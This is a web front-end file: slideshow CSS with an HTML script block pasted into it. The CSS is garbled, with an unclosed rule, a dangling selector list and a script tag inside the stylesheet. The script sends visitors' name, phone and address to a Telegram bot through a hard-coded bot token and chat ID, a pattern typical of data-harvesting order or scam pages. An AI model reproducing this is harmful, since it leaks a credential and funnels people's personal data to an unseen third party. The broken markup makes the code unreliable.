* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;

@import url(https://fonts.googleapis.com/css?family=Varela+Round);


.slides {
    padding: 0;
    width: 300px;
    height: 150px;
    display: block;
    margin: 0 auto;
    position: relative;
}

.slides * {
    user-select: none;
    -ms-user-select: none;
    -moz-user-select: none;
    -khtml-user-select: none;
    -webkit-user-select: none;
    -webkit-touch-callout: none;
}

.slides input { display: none; }

.slide-container { display: block; }

.slide {
    top: 0;
    opacity: 0;
    width: 300px;
    height: 150px;
    display: block;
    position: absolute;

    transform: scale(0);

    transition: all .7s ease-in-out;
}

.slide img {
    width: 100%;
    height: 100%;
}

.nav label {
    width: 20px;
    height: 10%;
    display: none;
    position: absolute;

	  opacity: 0;
    z-index: 9;
    cursor: pointer;

    transition: opacity .2s;

    color: #FFF;
    font-size: 156pt;
    text-align: center;
    line-height: 380px;
    font-family: "Varela Round", sans-serif;
    background-color: rgba(255, 255, 255, .3);
    text-shadow: 0px 0px 15px rgb(119, 119, 119);
}

.slide:hover + .nav label { opacity: 0.5; }

.nav label:hover { opacity: 1; }

.nav .next { right: 0; }

input:checked + .slide-container  .slide {
    opacity: 1;

    transform: scale(1);

    transition: opacity 1s ease-in-out;
}

input:checked + .slide-container .nav label { display: block; }

.nav-dots {
	width: 100%;
	bottom: 9px;
	height: 11px;
	display: block;
	position: absolute;
	text-align: center;
}

.nav-dots .nav-dot {
	top: -5px;
	width: 11px;
	height: 11px;
	margin: 0 4px;
	position: relative;
	border-radius: 100%;
	display: inline-block;
	background-color: rgba(0, 0, 0, 0.6);
}

.nav-dots .nav-dot:hover {
	cursor: pointer;
	background-color: rgba(0, 0, 0, 0.8);
}

input#img-1:checked ~ .nav-dots label#img-dot-1,
input#img-2:checked ~ .nav-dots label#img-dot-2,
input#img-3:checked ~ .nav-dots label#img-dot-3,
input#img-4:checked ~ .nav-dots label#img-dot-4,
input#img-5:checked ~ .nav-dots label#img-dot-5,

	background: rgba(0, 0, 0, 0.8);
}

    <script>
        // Character count functionality
        document.getElementById('address').addEventListener('input', function() {
            var text = this.value;
            var charCount = text.length;
            var charLimit = 200;
            var remainingChars = charLimit - charCount;
    
            if (remainingChars < 0) {
                this.value = text.slice(0, charLimit);
                remainingChars = 0;
            }
    
            document.getElementById('charCount').textContent = charCount + '/' + charLimit + ' characters, ';
            document.getElementById('remainingChars').textContent = remainingChars + ' characters remaining';
        });
    
        // Form submission handler
        document.getElementById('userForm').addEventListener('submit', function(event) {
            event.preventDefault();
    
            const submitButton = document.querySelector('button[type="submit"]');
            submitButton.textContent = 'Please Wait......';
            submitButton.style.backgroundColor = '#cccccc';
            submitButton.style.borderColor = '#ddd'; // Gray color
            submitButton.style.cursor = 'not-allowed'; // Change cursor to not-allowed
            submitButton.disabled = true;
    
            const name = document.getElementById('name').value;
            const phone = document.getElementById('phone').value;
            const address = document.getElementById('address').value;
    
            const message = `Name: ${name}\nPhone: ${phone}\nAddress: ${address}`;
    
            const botToken = '7392532777:AAGpPj9kNG0_bO1sFaxPRZtxPuYCIrC_eaE';
            const chatId = '-1002224878464';
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
            const payload = {
                chat_id: chatId,
                text: message
            };
    
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('Registration Completed!!');
                } else {
                    alert('Error: Please try again.');
                }
                location.reload(); // Refresh the page after the alert
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error: Please try again.');
                location.reload(); // Refresh the page after the alert
            });
        });
    </script>
